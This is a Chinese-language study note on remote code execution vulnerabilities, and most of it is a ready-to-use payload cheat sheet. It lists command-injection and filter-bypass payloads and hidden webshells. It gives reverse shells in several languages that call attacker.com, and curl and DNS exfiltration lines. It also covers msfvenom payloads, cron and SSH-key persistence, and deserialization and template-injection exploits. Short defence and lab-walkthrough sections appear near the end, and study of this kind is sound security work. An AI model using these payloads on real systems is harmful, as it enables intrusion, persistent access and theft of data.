# RCE（远程代码执行）漏洞学习笔记

## 目录

1. [RCE漏洞概述](#1-rce漏洞概述)
2. [RCE漏洞基础](#2-rce漏洞基础)
3. [RCE漏洞进阶](#3-rce漏洞进阶)
4. [RCE漏洞利用技术](#4-rce漏洞利用技术)
5. [RCE漏洞防御](#5-rce漏洞防御)
6. [靶场实战](#6-靶场实战)
7. [工具与资源](#7-工具与资源)

---

## 1. RCE漏洞概述

### 1.1 什么是RCE漏洞

RCE（Remote Code Execution，远程代码执行）是指攻击者能够通过构造恶意输入，在目标服务器上执行任意代码或命令的安全漏洞。RCE是Web安全中最危险的漏洞类型之一，一旦存在，攻击者可以完全控制目标服务器。

### 1.2 RCE与相关概念的区别

| 漏洞类型 | 说明 | 危害程度 |
|---------|------|---------|
| **RCE** | 远程代码执行，可在服务器上执行任意代码 | 极高 |
| **OS命令注入** | 执行系统命令 | 极高 |
| **代码执行** | 执行服务器端代码片段 | 极高 |
| **文件上传** | 上传恶意文件 | 高 |
| **文件包含** | 包含执行恶意文件 | 高 |

### 1.3 RCE漏洞的成因

1. **用户输入未过滤**：直接将用户输入传递给代码执行函数
2. **动态代码执行**：使用`eval()`、`exec()`等函数处理用户输入
3. **命令注入**：使用`system()`、`exec()`、`shell_exec()`等函数执行系统命令
4. **反序列化漏洞**：不安全的反序列化导致代码执行
5. **模板注入**：模板引擎的SSTI漏洞

---

## 2. RCE漏洞基础

### 2.1 命令执行基础

#### 2.1.1 常见命令执行函数

**PHP命令执行函数：**
```php
// system() - 执行命令并输出结果
system("ls -la");

// exec() - 执行命令，仅返回最后一行
exec("whoami", $output);
print_r($output);

// shell_exec() - 通过shell执行命令，返回完整输出
$output = shell_exec("id");

// passthru() - 执行命令并输出原始结果
passthru("cat /etc/passwd");

// 反引号`` - shell_exec的简写形式
$output = `whoami`;

// popen() / proc_open() - 打开进程管道
$handle = popen("ls", "r");
```

**Python命令执行函数：**
```python
import os
import subprocess

# os.system() - 执行命令
os.system("whoami")

# os.popen() - 返回文件对象
output = os.popen("id").read()

# subprocess模块
subprocess.run(["ls", "-la"])
subprocess.call("ls", shell=True)
subprocess.check_output(["whoami"])
```

**Java命令执行：**
```java
// Runtime.exec()
Runtime.getRuntime().exec("ls -la");

// ProcessBuilder
ProcessBuilder pb = new ProcessBuilder("ls", "-la");
pb.start();
```

**Node.js命令执行：**
```javascript
const { exec } = require('child_process');
exec('whoami', (error, stdout, stderr) => {
    console.log(stdout);
});

// child_process.spawn
const { spawn } = require('child_process');
spawn('ls', ['-la']);
```

### 2.2 命令连接符

| 连接符 | 说明 | 示例 |
|-------|------|------|
| `;` | 命令分隔符，顺序执行 | `cmd1; cmd2` |
| `\|` | 管道，前一个输出作为后一个输入 | `cmd1 \| cmd2` |
| `||` | 或，前一个失败才执行后一个 | `cmd1 \|\| cmd2` |
| `&&` | 与，前一个成功才执行后一个 | `cmd1 && cmd2` |
| `` ` `` | 命令替换，输出作为另一命令参数 | `` `cmd` `` |
| `$()` | 命令替换（现代写法） | `$(cmd)` |
| `>` | 输出重定向 | `cmd > file` |
| `<` | 输入重定向 | `cmd < file` |

### 2.3 基础命令注入

#### 2.3.1 DVWA命令注入示例

```php
// 漏洞代码
$target = $_REQUEST['ip'];
$cmd = "ping -c 3 " . $target;
system($cmd);
```

**Payload示例：**

```bash
# 基本命令注入
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 && whoami

# 获取系统信息
127.0.0.1 && uname -a
127.0.0.1 && cat /etc/os-release

# 读取敏感文件
127.0.0.1 && cat /etc/passwd
127.0.0.1 && cat /etc/hosts

# 写入webshell
127.0.0.1 && echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 反弹shell
127.0.0.1 && bash -i >& /dev/tcp/attacker/port 0>&1
```

### 2.4 常见注入点识别

#### 2.4.1 URL参数注入
```
http://target.com/ping?ip=127.0.0.1;whoami
```

#### 2.4.2 POST数据注入
```http
POST /submit HTTP/1.1
Host: target.com

host=127.0.0.1&cmd=whoami
```

#### 2.4.3 HTTP头注入
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1;whoami
```

### 2.5 简单的RCE漏洞检测

```bash
# 时间盲注检测
# Linux
sleep 5
127.0.0.1;sleep 5

# Windows
ping -n 5 127.0.0.1

# DNS外带检测
curl http://attacker.com/$(whoami)
```

---

## 3. RCE漏洞进阶

### 3.1 绕过过滤技术

#### 3.1.1 空格过滤绕过

```bash
# 使用$IFS
echo$IFS$9hello

# 使用{cmd,}
{cat,/etc/passwd}

# 使用制表符
cat<<<"/etc/passwd"

# 使用换行
cat\
/etc/passwd

# 使用重定向
cat</etc/passwd
```

#### 3.1.2 命令名过滤绕过

```bash
# 大小写绕过
a="/bin/bash"
${a,,}
${PATH:~0}

# 字符串拼接
c="at"
ca${c}/etc/passwd

# 使用base64编码
echo "bHMgLWxh" | base64 -d
$(echo "bHMgLWxh" | base64 -d)
```

#### 3.1.3 关键词过滤绕过

```bash
# cat被过滤时
tac、less、more、head、tail、nl、sed、awk、grep

# 使用通配符
/???/??t /??t??/*

# 使用字符串拼接
c="at"
/bin/c${c} /etc/passwd

# 使用编码
$(printf "\x63\x61\x74")
```

#### 3.1.4 引号转义

```bash
# 单引号
c''at /etc/passwd

# 双引号
c""at /etc/passwd

# 反斜杠
c\at /etc/passwd
```

#### 3.1.5 命令分隔符绕过

```bash
# 分号被过滤
127.0.0.1%0awhoami
127.0.0.1%0dwhoami
127.0.0.1%0a%0dwhoami
```

### 3.2 高级命令注入技巧

#### 3.2.1 写文件技巧

```bash
# 使用echo
echo '<?php phpinfo();?>' > shell.php

# 使用cat with heredoc
cat > shell.php <<EOF
<?php
system(\$_GET['cmd']);
?>
EOF

# 使用printf
printf '<?php system($_GET["cmd"]);?>' > shell.php

# 使用base64
echo "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==" | base64 -d > shell.php
```

#### 3.2.2 读取文件技巧

```bash
# 使用不同命令读取
cat /etc/passwd
tac /etc/passwd
head -1 /etc/passwd
tail -1 /etc/passwd
less /etc/passwd
more /etc/passwd

# 文件内容搜索
grep root /etc/passwd
awk -F: '/root/ {print $1}' /etc/passwd
sed -n '/root/p' /etc/passwd

# 十六进制读取
xxd /etc/passwd
od -c /etc/passwd
```

#### 3.2.3 目录遍历与文件搜索

```bash
# 目录遍历
ls -la /
ls -la /var/www/html/
find / -name "*.php" 2>/dev/null

# 文件查找
find / -perm -u=s 2>/dev/null  # SUID文件
find / -name "config*" 2>/dev/null
find / -writable 2>/dev/null

# 文件类型
file /etc/passwd
stat /etc/passwd
```

### 3.3 反弹Shell技术

#### 3.3.1 Bash反弹Shell

```bash
# 标准bash反弹
bash -i >& /dev/tcp/attacker/port 0>&1

# 简化版
bash -i

# 使用文件描述符
exec 5<>/dev/tcp/attacker/port
```

#### 3.3.2 Netcat反弹Shell

```bash
# 攻击者监听
nc -lvnp 4444

# 目标执行
nc -e /bin/bash attacker.com 4444

# 如果-e不可用
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

#### 3.3.3 Python反弹Shell

```python
# Python 3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### 3.3.4 PHP反弹Shell

```php
// 基础反弹
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

// 完整PHP webshell
<?php
$sock = fsockopen("attacker.com", 4444);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

#### 3.3.5 Perl反弹Shell

```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

#### 3.3.6 Ruby反弹Shell

```ruby
ruby -rsocket -e 'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

#### 3.3.7 MSFvenom生成Payload

```bash
# Linux Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f elf > shell.elf

# Windows Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f exe > shell.exe

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php

# Python Meterpreter
msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444
```

### 3.4 权限维持

#### 3.4.1 Cron定时任务

```bash
# 写入crontab
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" >> /var/spool/cron/crontabs/root
```

#### 3.4.2 SSH密钥

```bash
# 添加SSH公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

#### 3.4.3 WebShell

```php
<?php
@eval($_POST['cmd']);
?>

<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>

<?php
$cmd = $_POST['cmd'];
eval("echo ".$cmd.";");
?>
```

#### 3.4.4 隐藏WebShell

```php
// 绕过检测的webshell
<?php
// 注释
$_ = 'sys'.'tem';
$_($cmd);  // system($cmd)
?>

// 无数字字母webshell
<?php
$_=[];
$_=@"$_";  // Array
$_=$_['os']='r';  // preg_replace
// ...
?>
```

### 3.5 内网渗透基础

#### 3.5.1 探测内网存活主机

```bash
# Ping扫描
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i & done

# Netcat扫描
nc -zv 192.168.1.1-254 80

# 脚本扫描
#!/bin/bash
for ip in $(seq 1 254); do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.$ip/80" 2>/dev/null && echo "[+] 192.168.1.$ip is up"
done
```

#### 3.5.2 端口扫描

```bash
# 单端口扫描
nc -zv 192.168.1.100 22,80,443,3306

# 常用端口扫描
for port in 21 22 23 25 80 443 3306 3389 5432 6379 8080 8443; do
    timeout 1 bash -c "echo >/dev/tcp/192.168.1.100/$port" 2>/dev/null && echo "$port open"
done
```

#### 3.5.3 隧道穿透

```bash
# SSH隧道
ssh -L 8080:localhost:80 user@target.com

# 反向隧道
ssh -R 8080:localhost:80 user@attacker.com

# 正向代理
ssh -D 1080 user@target.com
```

---

## 4. RCE漏洞利用技术

### 4.1 无回显RCE利用

#### 4.1.1 DNS外带

```bash
# 使用DNSLog平台
curl http://xxx.dnslog.cn/$(whoami)
ping -c 1 $(whoami).xxx.dnslog.cn

# 使用自己的DNS服务器
for i in {1..254}; do dig $(cat /etc/passwd | cut -c1 | head -$i | tail -1).attacker.com; done
```

#### 4.1.2 HTTP外带

```bash
# 发送请求
curl http://attacker.com/$(whoami)
wget http://attacker.com/$(whoami)

# POST数据外带
curl -X POST -d "data=$(whoami)" http://attacker.com/
```

#### 4.1.3 时间盲注

```bash
# Linux
127.0.0.1; if [ $(whoami | cut -c1) == "r" ]; then sleep 10; fi

# 判断文件存在
127.0.0.1; if [ -f /etc/passwd ]; then sleep 5; fi

# 端口探测时间判断
127.0.0.1; (sh -i >& /dev/tcp/192.168.1.1/80 0>&1 &) && sleep 5
```

### 4.2 编码绕过

#### 4.2.1 Base64编码

```bash
# 编码命令
echo "whoami" | base64

# 执行编码后的命令
echo "d2hvYW1p" | base64 -d | bash
$(echo "d2hvYW1p" | base64 -d)
```

#### 4.2.2 Hex编码

```bash
# 编码
echo -n "whoami" | xxd -p

# 执行
echo "77686f616d69" | xxd -p -r | bash
```

#### 4.2.3 URL编码

```bash
# 编码特殊字符
%3B --> ;
%7C --> |
%26 --> &
%20 --> 空格
```

#### 4.2.4 ROT13

```bash
# ROT13编码
echo "whoami" | tr 'a-z' 'n-za-m'

# 执行
echo "whoami" | tr 'a-z' 'n-za-m' | bash
```

### 4.3 混淆技术

#### 4.3.1 字符串拼接

```bash
# 变量拼接
a="wh"; b="oam"; $a$b

# 命令替换
$(echo "whoa" | cut -c1-2)$(echo "mi" | cut -c2-3)

# 参数构造
/???/?????? ????.???  # cat /etc/passwd
```

#### 4.3.2 变量替换

```bash
# 环境变量
${PATH}
${HOME}
${PWD}

# 变量定义
a=whoami
$a

# 级联变量
${a}m
```

#### 4.3.3 历史命令

```bash
# 使用历史扩展
!!
!n  # 第n条命令

# 使用fc
fc -e : -1  # 执行上一条命令
```

### 4.4 代码执行漏洞

#### 4.4.1 PHP代码执行

```php
<?php
// eval - 执行字符串作为PHP代码
eval($_POST['cmd']);

// assert - 函数断言（低版本可执行代码）
assert($_POST['cmd']);

// preg_replace - /e修饰符执行代码
preg_replace("/.*/e", $_POST['cmd'], "");

// create_function - 创建匿名函数
$func = create_function('', $_POST['cmd']);

// call_user_func/call_user_func_array
call_user_func($_POST['func'], $_POST['arg']);

// array_map
array_map($_POST['func'], $_POST['args']);

// usort/uasort - 排序回调
usort($_GET['arr'], $_POST['cmd']);
?>

<?php
// 动态变量
${$_GET['cmd']}();

// 动态函数
$_GET['func']();
?>
```

#### 4.4.2 Python代码执行

```python
# eval - 求值表达式
eval(input())

# exec - 执行代码
exec(input())

# __import__ - 导入模块
__import__('os').system('whoami')

# getattr - 获取属性
getattr(__builtins__, 'eval')('__import__("os").system("whoami")')

# 特殊变量
__globals__, __code__, __loader__
```

#### 4.4.3 Java代码执行

```java
// Runtime.exec() 限制
// 无法使用管道、重定向等

// ProcessBuilder绕过
String[] cmd = {"/bin/bash", "-c", "whoami | tee /tmp/out.txt"};
new ProcessBuilder(cmd).start();

// 反射
Class.forName("java.lang.Runtime")
    .getMethod("getRuntime")
    .invoke(null)
    .exec("whoami");
```

### 4.5 反序列化RCE

#### 4.5.1 PHP反序列化

```php
<?php
class Test {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}

// 序列化payload
$obj = new Test();
$obj->cmd = "whoami";
echo serialize($obj);

// O:4:"Test":1:{s:3:"cmd";s:6:"whoami";}
?>

// 当__wakeup可用时，触发
unserialize($_POST['data']);
```

#### 4.5.2 Python反序列化

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = "whoami"
        return (os.system, (cmd,))

# 生成payload
payload = pickle.dumps(RCE())
print(payload)

# 反序列化触发
pickle.loads(payload)
```

#### 4.5.3 Java反序列化

```java
// 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections6 "whoami" > payload.ser

// 发送payload
curl -X POST -d "$(xxd -p payload.ser)" http://target.com/api/unserialize
```

### 4.6 模板注入（SSTI）

#### 4.6.1 Jinja2 (Python)

```python
# Flask/Jinja2 SSTI
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('whoami') }}

# 简化Payload
{{ cycler.__init__.__globals__.os.system('whoami') }}
{{ request.__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].system('whoami') }}
```

#### 4.6.2 Thymeleaf (Java)

```html
<!-- Thymeleaf SSTI -->
${T(java.lang.Runtime).getRuntime().exec('whoami')}
```

#### 4.6.3 FreeMarker (Java)

```html
<!-- FreeMarker SSTI -->
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex('whoami')}
```

---

## 5. RCE漏洞防御

### 5.1 输入验证

```php
<?php
// 白名单验证
$allowed_cmds = ['ping', 'traceroute', 'nslookup'];
if (!in_array($cmd, $allowed_cmds)) {
    die('Invalid command');
}

// IP地址格式验证
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die('Invalid IP address');
}

// 使用正则验证
if (!preg_match('/^[a-zA-Z0-9\.]+$/', $input)) {
    die('Invalid input');
}
?>
```

### 5.2 参数化执行

```php
<?php
// 使用escapeshellarg和escapeshellcmd
$cmd = escapeshellarg($input);
system("ping -c 3 " . $cmd);

// 避免shell执行，使用exec的数组形式
$cmd = ['ping', '-c', '3', $ip];
exec($cmd, $output);
?>
```

### 5.3 禁用危险函数

```php
; php.ini
disable_functions = system,exec,shell_exec,passthru,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

### 5.4 最小权限原则

```bash
# Web服务使用低权限用户运行
useradd -r -s /sbin/nologin webapp
su - webapp -c "php-fpm"

# 使用chroot隔离
chroot /var/www/html

# 使用容器隔离
docker run --rm --read-only -v /tmp:/tmp webapp
```

### 5.5 安全配置

```php
<?php
// 关闭危险配置
ini_set('open_basedir', '/var/www/html');
ini_set('allow_url_fopen', 0);
ini_set('disable_functions', 'exec,system,shell_exec,passthru');

// 使用WAF
// ModSecurity, 宝塔, 安全狗等
?>
```

---

## 6. 靶场实战

### 6.1 DVWA命令注入

**低级：**
```bash
# 直接注入
127.0.0.1; cat /etc/passwd
```

**中级：**
```bash
# 分号过滤绕过
127.0.0.1 | cat /etc/passwd
127.0.0.1 || cat /etc/passwd
127.0.0.1%0a cat /etc/passwd
```

**高级：**
```bash
# 空格绕过
127.0.0.1%0a${IFS}cat${IFS}/etc/passwd
127.0.0.1%0a$(IFS=_;cat$IFS$/etc/passwd)
127.0.0.1%0acat</etc/passwd
```

### 6.2 Pikachu RCE靶场

```bash
# 测试命令执行
127.0.0.1

# 写webshell
127.0.0.1 | echo '<?php phpinfo();?>' > shell.php

# 无回显利用
127.0.0.1 | curl http://attacker.com/$(whoami)
```

### 6.3 WebGoat

```java
// Java反序列化漏洞
// 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections5 "nc -e /bin/bash attacker.com 4444" > payload
```

---

## 7. 工具与资源

### 7.1 常用工具

| 工具 | 用途 |
|------|------|
| Burp Suite | 抓包、测试RCE |
| SQLMap | 检测反序列化RCE |
| Metasploit | 生成payload、渗透测试 |
| ysoserial | Java反序列化payload生成 |
| ysoserial.net | .NET反序列化payload生成 |
| Commix | 命令注入自动化检测 |
| GDB | 调试分析 |

### 7.2 DNSLog平台

- http://dnslog.cn
- http://ceye.io
- http://dnslog.link
- Burp Suite Collaborator

### 7.3 在线学习资源

- OWASP
- Vulhub漏洞环境
- Docker pull vulhub/*
- HackTheBox
- TryHackMe
- DVWA

### 7.4 常用命令速查

```bash
# 系统信息
uname -a
cat /etc/os-release
whoami
id
cat /etc/passwd

# 网络信息
ifconfig / ip addr
netstat -tulnp
ss -tulnp

# 进程信息
ps aux
top

# 文件操作
ls -la
cat /etc/passwd
find / -name "*.php" 2>/dev/null

# 用户信息
w / who
last / lastlog
sudo -l

# 提权辅助
cat /etc/crontab
cat /etc/sudoers
find / -perm -u=s 2>/dev/null
```

---

## 附录：常见Payload总结

### 命令执行基础Payload

```bash
# Linux
;whoami
|whoami
&whoami
&&whoami
||whoami
`whoami`
$(whoami)
\nwhoami
%0a whoami

# Windows
;whoami
&whoami
&&whoami
|whoami
```

### 反弹Shell Payload

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1

# Netcat
nc -e /bin/bash IP PORT

# Python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

*笔记整理时间：2026年6月*
